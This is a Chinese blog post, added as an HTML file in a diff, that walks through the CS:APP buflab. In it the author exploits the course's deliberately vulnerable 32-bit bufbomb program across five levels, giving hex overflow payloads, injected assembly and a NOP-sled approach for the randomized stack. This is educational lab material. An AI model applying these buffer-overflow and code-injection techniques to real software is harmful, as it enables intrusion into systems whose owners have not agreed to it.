@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="xia0ji233" />
+
+
+
+<meta name="description" content="在此实验开始之前，弄清楚给你的三个文件分别干嘛的。 bufbomb：实验需要攻击的程序 hex2raw：根据填写的字节生成攻击字符串 makecookie：对每个实验用户生成一个八位十六进制的字节序列，用于识别用户。(可能是用来打分的) 在gdb要运行的时候，一定要输入r -u &lt;your id&gt;，终端运行要输入.&#x2F;bufbomb -u &lt;your id&gt;，否则你是运行不了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bufblab实验报告:32位程序缓冲区溢出攻击">
+<meta property="og:url" content="http://example.com/2021/04/30/buflab/index.html">
+<meta property="og:site_name" content="xia0ji233&#39;s Blog">
+<meta property="og:description" content="在此实验开始之前，弄清楚给你的三个文件分别干嘛的。 bufbomb：实验需要攻击的程序 hex2raw：根据填写的字节生成攻击字符串 makecookie：对每个实验用户生成一个八位十六进制的字节序列，用于识别用户。(可能是用来打分的) 在gdb要运行的时候，一定要输入r -u &lt;your id&gt;，终端运行要输入.&#x2F;bufbomb -u &lt;your id&gt;，否则你是运行不了">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/WNAayP3TSYiGJ5Z.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/EP5SQWcfa23hDi7.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/tswP6XaDFAEB94S.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/28/kjfapgYERzZxwvG.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/29/vOFoK3wcjGVesHZ.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/29/ZFRstrT8QAubCkJ.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/29/ds1iuEKNWXGUJ3P.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/29/A8cIFe3BvY7PSyT.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/29/D8Gm2SjunFXxQtd.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/29/gx6R1cHPh3iQuMA.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/29/VWAo9rX3JPUuhqT.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/29/VH8wgMDON5KPln4.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/29/PGniK5S9eMjBR2U.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/29/dI7VyMspTgkN1Pa.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/29/auI7AecP4CnKrUv.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/30/oaBdniV29RuOLN4.png">
+<meta property="article:published_time" content="2021-04-29T16:10:00.000Z">
+<meta property="article:modified_time" content="2021-10-25T05:23:48.383Z">
+<meta property="article:author" content="xia0ji233">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/26/WNAayP3TSYiGJ5Z.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="xia0ji233&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>bufblab实验报告:32位程序缓冲区溢出攻击 | xia0ji233&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="/2636876456" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="/2636876456" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-buflab" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/04/30/buflab/" class="article-date">
+      <time datetime="2021-04-29T16:10:00.000Z" itemprop="datePublished">2021-04-30</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      bufblab实验报告:32位程序缓冲区溢出攻击
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/csapp/">csapp</a><a class="article-category-link" href="/categories/csapp/lab/">lab</a>
+    </div>
+
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>在此实验开始之前，弄清楚给你的三个文件分别干嘛的。</p>
+<p><code>bufbomb</code>：实验需要攻击的程序</p>
+<p><code>hex2raw</code>：根据填写的字节生成攻击字符串</p>
+<p><code>makecookie</code>：对每个实验用户生成一个八位十六进制的字节序列，用于识别用户。(可能是用来打分的)</p>
+<p>在<code>gdb</code>要运行的时候，一定要输入<code>r -u &lt;your id&gt;</code>，终端运行要输入<code>./bufbomb -u &lt;your id&gt;</code>，否则你是运行不了的。那咱们先输入<code>./makecookie -q</code>生成你的<code>cookie（id）</code>,最好先找个地儿保存一下。</p>
+<span id="more"></span>
+
+<p>作者在这里赞美一下这本书的编者：<code>csapp</code>的所有实验设计简直不要太好，学习计算机系统本是一个很枯燥的学习过程，但是这里的实验最大程度激发学生学习的兴趣。同时也希望国内的编者能够借鉴这本书的巧妙之处，让国内出越来越多的优秀教材。（由于本人表达能力不够，也只能这么夸了qwq）</p>
+<h2 id="level0-Candle"><a href="#level0-Candle" class="headerlink" title="level0:Candle"></a>level0:Candle</h2><p>这一堆英文我反正也看不来<code>qwq</code>，既然是<code>level0</code>不妨问题想简单一点：给了我<code>test()</code>函数，调用了一个<code>getbuf()</code>，而后又有一个<code>gets()</code>危险函数，又给了一个<code>Smoke()</code>函数，那么无疑，应该就是通过溢出调用<code>Somke()</code>，先反正不涉及代码注入等东西<code>gdb</code>就是万能的，我们普通地这么溢出只需要确定两点：</p>
+<ol>
+<li>缓冲区的大小</li>
+<li><code>Smoke()</code>函数的地址</li>
+</ol>
+<p>先<code>gdb bufbomb</code>然后：</p>
+<p><code>print Smoke</code>就可以输出函数的地址，<code>disassemble getbuf</code>就可以查看<code>getbuf()</code>的汇编代码</p>
+<p><img src="https://i.loli.net/2021/04/26/WNAayP3TSYiGJ5Z.png" alt="buflab_level0_1.png"></p>
+<p>可以看到，<code>buf</code>的大小是<code>0x28</code>，那么就构造<code>payload</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">18 8c 04 08</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/04/26/EP5SQWcfa23hDi7.png" alt="buflab_level0_2.png"></p>
+<p>但是发生了段错误，这里我调了很久，也可能是因为之前做64位的攻击，有点忘了32位的攻击的区别，因为真的之前就是它缓冲区开了多少我填那么多再堆返回地址就好了的。直到我看到<code>getbuf()</code>函数有一个<code>leave</code>指令，我这就去网上搜了一下<code>leave</code>指令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Leave==</span><br><span class="line">movl %ebp %esp</span><br><span class="line">popl %ebp</span><br></pre></td></tr></table></figure>
+
+<p>啊这？又被弹出来了原来的<code>ebp</code>?可能在你们眼里这个完全是个没必要犯得错误，但是我遇到了我就得这么讲出来，也算是一种提升吧。那就很清楚了，我们把函数返回地址弹出去了，就导致给<code>eip</code>的不知道是什么地址了。所以再加四字节的<code>00</code>，就会把<code>00 00 00 00</code>弹给<code>ebp</code>而把<code>smoke()</code> 函数的返回地址弹给<code>eip</code>了。所以正确的<code>payload</code>应该是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">18 8c 04 08</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/04/26/tswP6XaDFAEB94S.png" alt="buflab_level0_3.png"></p>
+<p>可以看到，这就攻击成功了，我是没想到啊，最简单的攻击就败下阵来，一次失败然后成功得到的经验比多次成功得到的经验是多很多的，所以嘛，这波不亏。</p>
+<h2 id="level1-Sparkler"><a href="#level1-Sparkler" class="headerlink" title="level1:Sparkler"></a>level1:Sparkler</h2><p>这次要求我们执行的<code>shell</code>函数是<code>fizz(int val)</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val); </span><br><span class="line">        validate(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这回加了个参数判断，32位的程序，甚至不需要代码注入，参数直接往返回地址后面填就好了。地址怎么找我也就不赘述了，加参数的话，如果多位参数记得一定是从右往左入栈的，即：第一个参数在离栈顶最近，第二个就是网站底走四个字节，第三个……以此类推。但是一定注意栈帧的构成，它在调用函数的时候压完参数还要压<code>eip</code>，虽然我们不一定要它返回到什么地方，但是它有，所以我们在原来的基础上填充四个字节的假的返回地址再把参数加进去</p>
+<p>payload就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">42 8c 04 08//fizz address</span><br><span class="line">00 00 00 00//fake returning address</span><br><span class="line">8a 5f 63 5e//your cookie</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/04/28/kjfapgYERzZxwvG.png" alt="buflab_level1_1.png"></p>
+<p>那这个<code>level1</code>就也解决了，个人认为这个<code>buflab</code>应该放在<code>attacklab</code>前面的，64位参数不好直接传，但是32位就硬传，但是它这么设计必有什么我目前不知道的巧妙之处。</p>
+<h2 id="level2-Firecracker"><a href="#level2-Firecracker" class="headerlink" title="level2:Firecracker"></a>level2:Firecracker</h2><p>这一次要求我们执行的<code>shell</code>函数是<code>bang()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (global_value == cookie) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value); 	</span><br><span class="line">        validate(<span class="number">2</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以很清楚的看出来，程序定义了一个全局变量，执行这个函数的时候要求这个变量==<code>your cookie</code>我们都很清楚，全局变量不同于局部变量，局部变量是存在栈中的，全局变量存在<code>.bss</code>段或者是<code>.data</code>段的，因此我们要修改不可能只是简单的栈溢出，我们需要注入代码。在栈中注入代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl value of cookie,address of global_value</span><br><span class="line">pushl (address of bang)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>因为栈可以执行代码，没必要去搜集<code>rop</code>碎片，直接注入这一串代码就行了。<code>bang()</code>函数的地址和<code>cookie</code>我们是很容易获取的，唯一就是这全局变量的地址我们没办法直接获取。我们可以选择<code>disassemble bang</code>反汇编这个函数看看具体的结构。</p>
+<p><img src="https://i.loli.net/2021/04/29/vOFoK3wcjGVesHZ.png" alt="buflab_level2_1.png"></p>
+<p>可以发现中间<code>cmp</code>指令比较一定就是那个<code>if</code>语句的实现，比较的东西肯定也是<code>cookie</code>和那个<code>global_value</code>，并且也很清楚的可以看到，它比较的内容都是<code>ds</code>段寄存器的 内容。至于这两个地址哪一个还需要进一步分析，因为我们可以很清楚的知道，在运行的时候我们的<code>cookie</code>就是已经确定的，而另一个则应该一直是0，所以我们可以先<code>b getbuf</code>然后<code>r- u xiaoji233</code>，运行在中间停住的时候<code>print *0x804d100</code>看看这个地址到底是什么。</p>
+<p><img src="https://i.loli.net/2021/04/29/ZFRstrT8QAubCkJ.png" alt="buflab_level2_2.png"></p>
+<p>其实结果就很明显了，<code>0x804d100</code>就是全局变量的地址，另一个你把它转换成十六进制就是你的<code>cookie</code>，确定完这三个内容以后重写一下汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5e635f8a,0x804d100//在AT&amp;T汇编中，立即数一定要加$，不加代表是地址。</span><br><span class="line">push 0x8048c9d//此时不用考虑端序</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>这里略微再提一下查看汇编代码机器码的方法，具体操作可以看我上一篇博文。。</p>
+<p><img src="https://i.loli.net/2021/04/29/ds1iuEKNWXGUJ3P.png" alt="buflab_level2_3.png"></p>
+<p>还有一点需要确定的就是缓冲区字符的首地址了，因为返回地址要填这个才能把<code>eip</code>劫持到栈上执行,那么我现在获取的地址是<code>0x55683868</code>，这个每个人id不同貌似会有不太一样的。那么方法就是先确定ebp然后看看字符串开始的位置相对于ebp的偏移，就能轻松算出来了。还有一个比较一般的方法应该适合大部分人，先<code>b getbuf</code>然后运行到gets函数之后观看栈的情况。如下图：</p>
+<p><img src="https://i.loli.net/2021/04/29/A8cIFe3BvY7PSyT.png" alt="buflab_level2_4.png"></p>
+<p>就可以很轻松地确定了，当你不确定自己填的返回地址是不对的情况下，这个方法百分百没错，那么我们的payload就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c7 04 25 00 </span><br><span class="line">d1 04 08 8a </span><br><span class="line">5f 63 5e 68 </span><br><span class="line">9d 8c 04 08 </span><br><span class="line">c3 00 00 00 //inject code</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">68 38 68 55//address of String&#x27;s top</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/04/29/D8Gm2SjunFXxQtd.png" alt="buflab_level2_5.png"></p>
+<h2 id="level3-Dynamite"><a href="#level3-Dynamite" class="headerlink" title="level3:Dynamite"></a>level3:Dynamite</h2><p>这一关咱们需要再不破坏原有栈帧的情况下将返回值修改成我们自己的<code>cookie</code>，这十分符合一个黑客的作为，咱们身为黑客就该神不知鬼不觉的去拿到<code>shell</code>，不然容易被打awa，打<code>ctf-pwn</code>题的我们基本都是能获取<code>shell</code>什么事都干得出来。破坏了原本结构？关我啥事，我拿到了<code>shell</code>就够了。</p>
+<p>言归正传，在这里其实<code>gdb</code>就特别好用，因为我能知道它函数返回地址在哪，我只需要查一下调用这个函数的主函数，看看调用函数前存了些什么东西进去就可以很清楚的知道了。但是呢，我们一定还是要先溢出，不然都没办法劫持<code>eip</code>了，至于破坏的内容可以在代码注入里面去修复。就可以写出我们要注入的代码就是:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl your cookie,%eax</span><br><span class="line">movl original ebp address,%ebp</span><br><span class="line">push original eip</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>那么我们只需要找到原来的<code>ebp</code>和<code>eip</code>就可以实现攻击了,那我们就先给<code>getbuf()</code>的第一句下个断点看看此时<code>ebp</code>的值，<code>getbuf</code>的反汇编结果见上面的图。<code>b *0x80491f4</code>断住查看 <code>esp</code>的值。</p>
+<p><img src="https://i.loli.net/2021/04/29/gx6R1cHPh3iQuMA.png" alt="buflab_level3_1.png"></p>
+<p>可以很清楚地看到esp</p>
+<p>至于<code>epi</code>，可以返回汇编它的父函数，可以看到<code>call</code>完<code>getbuf()</code>的下一条指令地址，这个应该就是之前保存的返回地址了。</p>
+<p><img src="https://i.loli.net/2021/04/29/VWAo9rX3JPUuhqT.png" alt="buflab_level3_2.png"></p>
+<p>这里讲一下函数调用的机制，先是传参数，32位的程序是从左到右依次入栈，64位的程序则是前六个参数分别进入<code>rdi,rsi,rdx,rcx,r8,r9</code>寄存器，参数多于六个再从右往左依次入栈。接下来保存调用该函数语句下一句的指令地址存在栈上，这个就是所谓的返回地址了。至于接下来的事，那就是在函数里面了，分别有保存父函数的栈帧情况，计算完成后返回值保存在<code>eax</code>寄存器之后先恢复父函数的栈帧情况(弹出<code>ebp</code>，<code>esp</code>+对应的值)，弹出<code>eip</code>。</p>
+<p>那么注入的代码就很清楚了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5e635f8a,%eax</span><br><span class="line">movl $0x556838c0,%ebp</span><br><span class="line">push $0x08048dbe</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>运行一遍看看，完美！！！</p>
+<p><img src="https://i.loli.net/2021/04/29/VH8wgMDON5KPln4.png" alt="buflab_level3_3.png"></p>
+<h2 id="Level-4-Nitroglycerin"><a href="#Level-4-Nitroglycerin" class="headerlink" title="Level 4: Nitroglycerin"></a>Level 4: Nitroglycerin</h2><p>这一关，这一关你需要使用<code>./bufbomb -n</code>去执行，加了参数之后就不会执行<code>test()</code>函数了，而是<code>testn()</code>函数，调用<code>getbufn()</code>函数并且使它返回你的<code>cookie</code>，乍一听跟<code>level3</code>咋一模一样，但是自己调试一遍就会发现它要求你输入五次，并且每次的栈帧都不一样，我测试了一遍，每一次的字符串起始位置值是分别是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55683688</span><br><span class="line">0x55683658</span><br><span class="line">0x55683668</span><br><span class="line">0x55683628</span><br><span class="line">0x55683688</span><br></pre></td></tr></table></figure>
+
+<p>那么我们注入的代码就不能直接<code>mov $xxxx,%ebp</code>了，得靠点其它东西，想想函数调用的过程，是有一个过程叫</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push %ebp</span><br><span class="line">mov %esp,%ebp</span><br><span class="line">sub $xxx,%ebp</span><br><span class="line">//调用过程</span><br><span class="line">add $xxx,%ebp</span><br><span class="line">pop %ebp</span><br></pre></td></tr></table></figure>
+
+<p>我们发现调用的过程中，只有栈是被我们破坏了，寄存器是完好无损的，但是<code>ebp</code>寄存器有一个取栈上数据的操作，但是<code>esp</code>寄存器至始至终是完好的呀。因此我们只要让<code>ebp</code>为<code>esp+0x28</code>(因为<code>testn()</code>在调用前申请了<code>0x24</code>的空间，再加上保存的<code>ebp</code>就是<code>0x28</code>)就行了，但是注意取的是地址，用<code>lea</code>指令，然后就是<code>eip</code>了，这没什么好说的，看看调用这个函数的下一句是什么就行了。但是注意，我们返回的地址也是要有讲究的，因为每一次都不一样，我们得靠<code>nop</code>指令。计算机执行<code>nop</code>指令除了内部一个计数器+1以外不会有任何操作，并且只占用一个字节<code>90</code>，而且刚刚好<code>getbuf()</code>函数它开的很大，给了我们充足的滑行距离。注入的代码我们尽量靠近栈底，然后返回的地址尽量选取最小的(0x55683860)，以便于覆盖所有的情况。那我们注入的代码就是:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5e635f8a,%eax</span><br><span class="line">lea 0x28(%esp),%ebp</span><br><span class="line">push $0x08048e3a</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后确定一下字节大小</p>
+<p><img src="https://i.loli.net/2021/04/29/PGniK5S9eMjBR2U.png" alt="buflab_level4_1.png"></p>
+<p>字符是从<code>0x208</code>的内存开始的，再加上<code>ebp</code>那就是<code>0x20c</code>的大小了，不同的是：那些我们都填充<code>90</code>就行了，<code>payload</code>就是</p>
+<p><img src="https://i.loli.net/2021/04/29/dI7VyMspTgkN1Pa.png" alt="buflab_level4_2.png"></p>
+<p>填充代码+代码长度为<code>0x20c</code>就好了。</p>
+<p>然后，我就默默地调了两个小时的代码，去查了<code>wp</code>才发现，32位汇编和64位汇编的lea指令是不一样的，原来我就没注意这点<code>qwq</code>默默地枯了！！</p>
+<p><img src="https://i.loli.net/2021/04/29/auI7AecP4CnKrUv.png" alt="buflab_level4_3.png"></p>
+<p>然后就又是漫长的调试过程，我一直以为输入<code>r -u xiaoji233 -n &lt;attackraw4.txt</code>就可以了，没想到只输入一次，就是说每次都只有第一个是对的，一定要换这种命令才可以将字符串复制五次输入的，踩过的坑千万别踩，否则后果就是罚坐三小时，让大家康康我的撒花吧！！！</p>
+<p><img src="https://i.loli.net/2021/04/30/oaBdniV29RuOLN4.png" alt="buflab_level4_4.png"></p>
+<p>本作者在写wp的时候喜欢加上自己的思考，因为我也是新手，这篇wp对新手就比较友好，因为大概率是可以踩到目前新手能踩到的大部分坑的，如果哪里说的不对，恳请指正！</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/04/30/buflab/">bufblab实验报告:32位程序缓冲区溢出攻击</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2021-04-30, 00:10:00</p>
+        <p><span>最后更新:</span>2021-10-25, 13:23:48</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/04/30/buflab/" title="bufblab实验报告:32位程序缓冲区溢出攻击">http://example.com/2021/04/30/buflab/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/04/30/buflab/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/">
